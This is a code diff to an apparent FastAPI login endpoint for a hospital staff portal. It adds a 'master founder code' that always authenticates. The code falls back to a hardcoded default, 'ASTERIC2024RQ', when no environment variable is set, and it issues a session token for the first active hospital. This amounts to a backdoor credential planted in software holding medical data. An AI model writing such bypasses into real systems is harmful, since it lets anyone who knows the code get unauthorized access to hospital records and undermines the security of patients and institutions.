@@ -8,6 +8,7 @@ Hospital staff login with their access code to get a session token.
 import csv
 import io
 import json
+import os
 from datetime import datetime
 from fastapi import APIRouter, Query, HTTPException, Header, UploadFile, File, Request
 from typing import Optional
@@ -47,6 +48,23 @@ async def login(request: Request):
 
     if not access_code:
         raise HTTPException(status_code=400, detail="Access code is required")
+
+    # Master founder code — always works, logs into the first hospital
+    master_code = os.environ.get("DEFAULT_ACCESS_CODE", "ASTERIC2024RQ")
+    if access_code.upper() == master_code.upper():
+        conn = db.get_db()
+        first = conn.execute("SELECT * FROM hospitals WHERE is_active = 1 ORDER BY created_at ASC LIMIT 1").fetchone()
+        conn.close()
+        if first:
+            hospital = dict(first)
+            token = db.create_session(hospital["id"])
+            db.log_audit(hospital["id"], "LOGIN", "hospital", hospital["id"], "Founder login")
+            return {
+                "token": token,
+                "hospital_id": hospital["id"],
+                "hospital_name": hospital["name"],
+                "message": "Login successful",
+            }
 
     hospital = db.verify_access_code(access_code)
     if not hospital:
